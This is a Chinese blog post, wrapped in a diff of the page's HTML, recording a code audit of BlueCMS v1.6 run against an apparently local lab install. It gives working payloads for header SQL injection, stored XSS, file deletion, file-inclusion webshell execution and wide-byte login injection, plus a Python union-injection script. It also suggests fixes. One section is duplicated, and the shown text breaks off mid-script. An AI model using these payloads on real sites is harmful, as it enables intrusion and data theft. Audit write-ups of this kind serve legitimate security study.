@@ -1,0 +1,575 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"lzer0kx.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="最近开始入门代码审计，carl师傅推荐入门审计的第一套php开源系统—bluecms v1.6 下载源码之后phpstudy一键安装 环境 php5.4.45+mysql5.7.26+apache2.4.39 工具 Seay源代码审计系统">
+<meta property="og:type" content="article">
+<meta property="og:title" content="bluecms v1.6">
+<meta property="og:url" content="http://lzer0kx.top/2022/10/10/bluecms-v1-6/index.html">
+<meta property="og:site_name" content="Lzer0Kx的信安之路">
+<meta property="og:description" content="最近开始入门代码审计，carl师傅推荐入门审计的第一套php开源系统—bluecms v1.6 下载源码之后phpstudy一键安装 环境 php5.4.45+mysql5.7.26+apache2.4.39 工具 Seay源代码审计系统">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/10/bluecms-v1-6/image-20221010220943098.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/10/bluecms-v1-6/image-20221010221016235.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/10/bluecms-v1-6/image-20221010221041444.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/10/bluecms-v1-6/image-20221010221107281.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/10/bluecms-v1-6/image-20221010221130933.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/10/bluecms-v1-6/image-20221010221210684.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/10/bluecms-v1-6/image-20221010221242225.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/10/bluecms-v1-6/image-20221010221317680.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/10/bluecms-v1-6/image-20221010221337253.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/10/bluecms-v1-6/image-20221010221401232.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/10/bluecms-v1-6/image-20221010221423421.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/10/bluecms-v1-6/image-20221010221457128.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/10/bluecms-v1-6/image-20221010221521145.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/10/bluecms-v1-6/image-20221010221551235.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/10/bluecms-v1-6/image-20221010221612425.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/10/bluecms-v1-6/image-20221010221627520.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/10/bluecms-v1-6/image-20221010221702804.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/10/bluecms-v1-6/image-20221010221722671.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/10/bluecms-v1-6/image-20221010221738761.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/10/bluecms-v1-6/image-20221010221808760.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/10/bluecms-v1-6/image-20221010221837488.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/10/bluecms-v1-6/image-20221010221903494.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/10/bluecms-v1-6/image-20221010221927350.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/10/bluecms-v1-6/image-20221010221947522.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/10/bluecms-v1-6/image-20221010222017964.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/10/bluecms-v1-6/image-20221010222045193.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/10/bluecms-v1-6/image-20221010222113622.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/10/bluecms-v1-6/image-20221010222138106.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/10/bluecms-v1-6/image-20221010222200474.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/10/bluecms-v1-6/image-20221010222222111.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/10/bluecms-v1-6/image-20221010222243446.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/10/bluecms-v1-6/image-20221010222321049.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/10/bluecms-v1-6/image-20221010222344822.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/10/bluecms-v1-6/image-20221010222405392.png">
+<meta property="article:published_time" content="2022-10-10T14:08:17.000Z">
+<meta property="article:modified_time" content="2022-10-10T14:24:45.776Z">
+<meta property="article:author" content="Lzer0Kx">
+<meta property="article:tag" content="PHP代码审计">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://lzer0kx.top/2022/10/10/bluecms-v1-6/image-20221010220943098.png">
+
+<link rel="canonical" href="http://lzer0kx.top/2022/10/10/bluecms-v1-6/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>bluecms v1.6 | Lzer0Kx的信安之路</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Lzer0Kx的信安之路</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://lzer0kx.top/2022/10/10/bluecms-v1-6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Lzer0Kx">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lzer0Kx的信安之路">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          bluecms v1.6
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-10-10 22:08:17 / 修改时间：22:24:45" itemprop="dateCreated datePublished" datetime="2022-10-10T22:08:17+08:00">2022-10-10</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>最近开始入门代码审计，carl师傅推荐入门审计的第一套php开源系统—bluecms v1.6</p>
+<p>下载源码之后phpstudy一键安装</p>
+<p>环境 php5.4.45+mysql5.7.26+apache2.4.39</p>
+<p>工具 Seay源代码审计系统</p>
+<span id="more"></span>
+
+<p>bluecms 目录结构</p>
+<p><img src="/2022/10/10/bluecms-v1-6/image-20221010220943098.png" alt="image-20221010220943098"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">admin    后台管理目录</span><br><span class="line">api      接口文件</span><br><span class="line">data     数据文件</span><br><span class="line">include  包含的全局文件</span><br><span class="line">install  安装部署cms所需文件</span><br><span class="line">template 模板文件</span><br></pre></td></tr></table></figure>
+
+<p>了解目录结构之后，我们先从index.php下手(index.php这样的文件开头都会包含一些文件，这些文件大多都是一些公用函数或者用来对变量进行防护的函数，这些函数对我们理解代码和发现漏洞都有帮助)，先访问一下</p>
+<p><img src="/2022/10/10/bluecms-v1-6/image-20221010221016235.png" alt="image-20221010221016235"></p>
+<p>我们从源码入手 开头有文件包含</p>
+<p><img src="/2022/10/10/bluecms-v1-6/image-20221010221041444.png" alt="image-20221010221041444"></p>
+<p>先查看include&#x2F;common.inc.php文件</p>
+<h3 id="缺陷1：-SERVER参数未过滤"><a href="#缺陷1：-SERVER参数未过滤" class="headerlink" title="缺陷1：$_SERVER参数未过滤"></a>缺陷1：$_SERVER参数未过滤</h3><p>位置 \uploads\include\common.inc.php</p>
+<p><img src="/2022/10/10/bluecms-v1-6/image-20221010221107281.png" alt="image-20221010221107281"></p>
+<p>首先对deep_addslashes函数进行跟踪，在uploads\include\common.fun.php下进行了定义</p>
+<p><img src="/2022/10/10/bluecms-v1-6/image-20221010221130933.png" alt="image-20221010221130933"></p>
+<p>deep_addslashes函数中是用addslashes来给过滤的</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">addslashes返回字符串，该字符串为了数据库查询语句等的需要在某些字符前</span><br><span class="line">加上了反斜线，这些字符是单引号，双引号，反斜线与NUL(null字符)</span><br></pre></td></tr></table></figure>
+
+<p>但是缺少对_SERVER的过滤，在其它函数中可能会用到_SERVER变量，可能造成注入等危害</p>
+<p>修复方案</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if(!get_magic_quotes_gpc())</span><br><span class="line"> &#123;</span><br><span class="line">   $_POST = deep_addslashes($_POST);</span><br><span class="line">   $_GET = deep_addslashes($_GET);</span><br><span class="line">   $_COOKIES = deep_addslashes($_COOKIES);</span><br><span class="line">   $_REQUEST = deep_addslashes($_REQUEST);</span><br><span class="line">   $_SERVER = deep_addslashes($_SERVER);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞1：guest-book-php存在http请求头注入"><a href="#漏洞1：guest-book-php存在http请求头注入" class="headerlink" title="漏洞1：guest_book.php存在http请求头注入"></a>漏洞1：guest_book.php存在http请求头注入</h3><p>由于cms并未对_SERVER变量进行过滤，则代码在处理数据包的ip时可能存在注入，全局搜素ip，在guest_book.php中发现有sql语句中含有online_ip</p>
+<p><img src="/2022/10/10/bluecms-v1-6/image-20221010221210684.png" alt="image-20221010221210684"></p>
+<p>全局搜索$online_ip</p>
+<p><img src="/2022/10/10/bluecms-v1-6/image-20221010221242225.png"></p>
+<p>可以看到$online_ip在user_fun.php中被定义，且启用了global全局变量</p>
+<p><img src="/2022/10/10/bluecms-v1-6/image-20221010221317680.png" alt="image-20221010221317680"></p>
+<p>$online_ip在common.inc.php中被赋值，且common.inc.php中包含user.fun.php</p>
+<p><img src="/2022/10/10/bluecms-v1-6/image-20221010221337253.png" alt="image-20221010221337253"></p>
+<p>这里将getip()的值赋给了$online_ip</p>
+<p>通过对getip()进行函数追踪 发现getid()在common.fun.php中的定义过程</p>
+<p><img src="/2022/10/10/bluecms-v1-6/image-20221010221401232.png" alt="image-20221010221401232"></p>
+<p>此时打开&#x2F;guest_book.php站点抓包分析</p>
+<p>但是这里有个小bug，在输入框不管输入什么内容都会显示输入为空，只能f12定位往源代码中插入</p>
+<p><img src="/2022/10/10/bluecms-v1-6/image-20221010221423421.png" alt="image-20221010221423421"></p>
+<p>注入payload</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1&#x27;,database()) #</span><br></pre></td></tr></table></figure>
+
+<p>完整数据包</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /uploads/guest_book.php HTTP/1.1</span><br><span class="line">Host: bluecms16</span><br><span class="line">Content-Length: 39</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://bluecms16</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://bluecms16/uploads/guest_book.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">X-Forwarded-For: 127.0.0.1&#x27;,database()) #</span><br><span class="line">Cookie: PHPSESSID=d4ufdvpct6ih9p4q5isvfqqj16</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">content=lzer0kx&amp;act=send&amp;rid=&amp;page_id=1</span><br></pre></td></tr></table></figure>
+
+<p>效果</p>
+<p><img src="/2022/10/10/bluecms-v1-6/image-20221010221457128.png" alt="image-20221010221457128"></p>
+<p>可以看到已经注入出了databases</p>
+<h3 id="漏洞2：会员中心等多处xss"><a href="#漏洞2：会员中心等多处xss" class="headerlink" title="漏洞2：会员中心等多处xss"></a>漏洞2：会员中心等多处xss</h3><p>继续在前台查看其它功能，在注册会员处查看代码：user.php</p>
+<p><img src="/2022/10/10/bluecms-v1-6/image-20221010221521145.png" alt="image-20221010221521145"></p>
+<p>user.php开头包含了common.inc.php文件，但是common.inc.php中的addslashes()对xss代码没有影响</p>
+<p>构造数据包</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /uploads/user.php HTTP/1.1</span><br><span class="line">Host: bluecms16</span><br><span class="line">Content-Length: 107</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://bluecms16</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://bluecms16/uploads/user.php?act=reg</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=7u1bv2m1idaug0f4tg56qtt439</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">referer=&amp;user_name=lkx111&amp;pwd=123456789&amp;pwd1=123456789&amp;email=yanshi%40qq.com&amp;safecode=bnsw&amp;from=&amp;act=do_reg</span><br></pre></td></tr></table></figure>
+
+<p>user.php对应的部分</p>
+<p><img src="/2022/10/10/bluecms-v1-6/image-20221010221551235.png" alt="image-20221010221551235"></p>
+<p>在传参中我们看到了我自己输入的账号|密码|邮箱|验证码，然后最后出现了一个act传参，打开这个user.php我们可以看出这个文件有好几个功能，act就是决定我的数据包是干什么的传参。同时我们注意到存在 INSERT INTO，并且没有过滤，就可以尝试xss</p>
+<p><img src="/2022/10/10/bluecms-v1-6/image-20221010221612425.png" alt="image-20221010221612425"></p>
+<p><img src="/2022/10/10/bluecms-v1-6/image-20221010221627520.png" alt="image-20221010221627520"></p>
+<p>触发存储型xss</p>
+<p>修复方案</p>
+<p>这里可以采用htmlspecialchars（）函数来对xss进行防护。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$email=htmlspecialchars($email,ENT_QUOTES);</span><br></pre></td></tr></table></figure>
+
+<p>htmlspecialchars别忘了加上ENT_QUOTES,因为默认htmlspecialchars只处理编码和双引号。</p>
+<h3 id="漏洞3：user-php中存在任意文件删除"><a href="#漏洞3：user-php中存在任意文件删除" class="headerlink" title="漏洞3：user.php中存在任意文件删除"></a>漏洞3：user.php中存在任意文件删除</h3><p>先查看user.php中的相关代码</p>
+<p><img src="/2022/10/10/bluecms-v1-6/image-20221010221702804.png" alt="image-20221010221702804"></p>
+<p>$face_pic对应的就是用户头像这里</p>
+<p><img src="/2022/10/10/bluecms-v1-6/image-20221010221722671.png" alt="image-20221010221722671"></p>
+<p><img src="/2022/10/10/bluecms-v1-6/image-20221010221738761.png" alt="image-20221010221738761"></p>
+<p>更新个人资料，大概逻辑就是当这个用户头像为空时，查看face_pic3是否存在，抓包测试只要face_pic3为空时，face_pic3的值都是上一次face_pic3的值，即上次的图片的存储位置，这里就对上次的图片进行删除，可是没有任何过滤，直接抓包修改这个路径就可以对任意文件进行删除</p>
+<h3 id="缺陷2：user-php处文件包含"><a href="#缺陷2：user-php处文件包含" class="headerlink" title="缺陷2：user.php处文件包含"></a>缺陷2：user.php处文件包含</h3><p>来到会员中心充值处</p>
+<p><img src="/2022/10/10/bluecms-v1-6/image-20221010221808760.png" alt="image-20221010221808760"></p>
+<p>查看对应代码</p>
+<p><img src="/2022/10/10/bluecms-v1-6/image-20221010221837488.png" alt="image-20221010221837488"></p>
+<p>这个pay参数是可控的 即使后面有&#x2F;index.php 但是可以进行截断</p>
+<p>截断在这里有两种方法 一种使用%00</p>
+<p>另一种是使用英文点(.)</p>
+<p>点号截断要求php版本小于5.2.8 00截断需要小于5.3.4 由于include可以使被包含的文件执行命令 且后缀不一定需要是php 则可以利用此处结合文件上传进行getshell</p>
+<h3 id="缺陷3：会员中心上传头像处没有进行内容检查"><a href="#缺陷3：会员中心上传头像处没有进行内容检查" class="headerlink" title="缺陷3：会员中心上传头像处没有进行内容检查"></a>缺陷3：会员中心上传头像处没有进行内容检查</h3><p>要利用上方的文件包含进行getshell首先需要上传小马 想到前台会员中心处的文件上传处</p>
+<p><img src="/2022/10/10/bluecms-v1-6/image-20221010221903494.png" alt="image-20221010221903494"></p>
+<p>查看代码</p>
+<p><img src="/2022/10/10/bluecms-v1-6/image-20221010221927350.png" alt="image-20221010221927350"></p>
+<p>这里将图片传给参数$face_pic参数 发现函数img_upload 尝试跟踪 在user.php下</p>
+<p><img src="/2022/10/10/bluecms-v1-6/image-20221010221947522.png" alt="image-20221010221947522"></p>
+<p>这里只有allow_image_type对文件后缀进行了检测</p>
+<p>并未对图片内容进行检测</p>
+<h3 id="漏洞4：user-php处通过文件包含getshell"><a href="#漏洞4：user-php处通过文件包含getshell" class="headerlink" title="漏洞4：user.php处通过文件包含getshell"></a>漏洞4：user.php处通过文件包含getshell</h3><p>在会员中心头像上传处直接上传一句话木马 将后缀改为jpg就可以绕过限制</p>
+<p><img src="/2022/10/10/bluecms-v1-6/image-20221010222017964.png" alt="image-20221010222017964"></p>
+<p>成功上传图片马</p>
+<p>payload</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&amp;pass=system(&#x27;whoami&#x27;);&amp;submit=%B9%BA%C2%F2&amp;act=pay&amp;pay=../../data/upload/face_pic/16636750000.jpg.........................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br></pre></td></tr></table></figure>
+
+<p>构造数据包成功getshell</p>
+<p>修复方案</p>
+<p>检测传递的参数值pay是否有特定的字符如英文的(.)还有斜杠</p>
+<p>更换php为更高级的版本</p>
+<p>对上传的图片进行内容检测</p>
+<h3 id="缺陷4：管理员登录处存在爆破"><a href="#缺陷4：管理员登录处存在爆破" class="headerlink" title="缺陷4：管理员登录处存在爆破"></a>缺陷4：管理员登录处存在爆破</h3><p>接下来对后台进行测试 访问&#x2F;admin&#x2F;login.php</p>
+<p><img src="/2022/10/10/bluecms-v1-6/image-20221010222045193.png" alt="image-20221010222045193"></p>
+<p>首先看到没有验证码的防护 就可能存在爆破</p>
+<p>查看源码</p>
+<p><img src="/2022/10/10/bluecms-v1-6/image-20221010222113622.png" alt="image-20221010222113622"></p>
+<p>也没有任何机制进行防护 于是可以直接进行爆破</p>
+<h3 id="漏洞5：管理员登录处利用宽字节万能密码注入"><a href="#漏洞5：管理员登录处利用宽字节万能密码注入" class="headerlink" title="漏洞5：管理员登录处利用宽字节万能密码注入"></a>漏洞5：管理员登录处利用宽字节万能密码注入</h3><p>在管理员登录处猜测可能存在注入 查看数据库使用gbk编码 准备尝试宽字节注入 全局搜素gbk</p>
+<p>在upload&#x2F;admin&#x2F;uc_setting.php找到</p>
+<p><img src="/2022/10/10/bluecms-v1-6/image-20221010222138106.png" alt="image-20221010222138106"></p>
+<p>回到upload&#x2F;admin&#x2F;login.php处，查看代码</p>
+<p><img src="/2022/10/10/bluecms-v1-6/image-20221010222200474.png" alt="image-20221010222200474"></p>
+<p>可以看到check_admin函数进行检测 追踪check_admin函数</p>
+<p><img src="/2022/10/10/bluecms-v1-6/image-20221010222222111.png" alt="image-20221010222222111"></p>
+<p>这里是单引号进行闭合 尝试对$name进行注入 前面我们说过 commom.inc.php对参数进行了addslashes()过滤 若变量出现单引号则加上反斜杠  </p>
+<p><img src="/2022/10/10/bluecms-v1-6/image-20221010222243446.png" alt="image-20221010222243446"></p>
+<p>修复方案</p>
+<p>在login.php中将登录处$admin_name执行sql语句前加上修复代码</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$len = strlen($admin_name);</span><br><span class="line">$num=0;</span><br><span class="line">while($num&lt;=$len)&#123;</span><br><span class="line">    $b=$admin_name&#123;$num&#125;;</span><br><span class="line">    $num=$num+1;</span><br><span class="line">    if(ord($b)&gt;127)&#123;</span><br><span class="line">      $admin_name=&quot;0&quot;;</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞6：广告列表处多处存在union联合注入"><a href="#漏洞6：广告列表处多处存在union联合注入" class="headerlink" title="漏洞6：广告列表处多处存在union联合注入"></a>漏洞6：广告列表处多处存在union联合注入</h3><p>进入后台后 在后台模块管理中的广告管理处新建广告 点击获取js看到如下代码</p>
+<p>修复方案</p>
+<p>在login.php中将登录处$admin_name执行sql语句前加上修复代码</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$len = strlen($admin_name);</span><br><span class="line">$num=0;</span><br><span class="line">while($num&lt;=$len)&#123;</span><br><span class="line">    $b=$admin_name&#123;$num&#125;;</span><br><span class="line">    $num=$num+1;</span><br><span class="line">    if(ord($b)&gt;127)&#123;</span><br><span class="line">      $admin_name=&quot;0&quot;;</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞6：广告列表处多处存在union联合注入-1"><a href="#漏洞6：广告列表处多处存在union联合注入-1" class="headerlink" title="漏洞6：广告列表处多处存在union联合注入"></a>漏洞6：广告列表处多处存在union联合注入</h3><p>进入后台后 在后台模块管理中的广告管理处新建广告 点击获取js看到如下代码</p>
+<p><img src="/2022/10/10/bluecms-v1-6/image-20221010222321049.png" alt="image-20221010222321049"></p>
+<p>我们去查看ad_js.php代码</p>
+<p><img src="/2022/10/10/bluecms-v1-6/image-20221010222344822.png" alt="image-20221010222344822"></p>
+<p>在追踪getone函数 在uploads&#x2F;include&#x2F;mysql&#x2F;class.php处</p>
+<p><img src="/2022/10/10/bluecms-v1-6/image-20221010222405392.png" alt="image-20221010222405392"></p>
+<p>继续分析ad_js.php sql语句并未对$ad_id两侧加上单引号或者双引号 则addslashes()过滤就没有用了 而且并不存在其它过滤</p>
+<p>构造payload</p>
+<p>首先order by判断列数是6 然后联合查询出数据</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3,4,5,6.database()</span><br></pre></td></tr></table></figure>
+
+<p>写个python脚本练练手</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">s_1=&quot;select group_concat(schema_name) from (information_schema.schemata)&quot;</span><br><span class="line">url=&quot;http://192.168.56.1/uploads/ad_js.php?ad_id=-3 union select 1,2,3,4,5,6,&quot;</span><br><span class="line">url_=url</span><br><span class="line">url=url_+&#x27;(&#x27;+s_1 +&#x27;)&#x27;</span><br><span class="line">a=requests.get(url=url)</span><br><span class="line">print(a.text) #查询所有数据库名称</span><br><span class="line">s_2=&quot;select group_concat(table_name) from information_schema.tables where table_schema=database() &quot;</span><br><span class="line">url=url_+&#x27;(&#x27;+s_2 +&#x27;)&#x27;</span><br><span class="line">a=requests.get(url=url)</span><br><span class="line">print(a.text) #查询当前数据库中的表</span><br><span class="line">s_3=&quot;select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x626c75655f61646d696e &quot;</span><br><span class="line">url=url_+&#x27;(&#x27;+s_3 +&#x27;)&#x27;</span><br><span 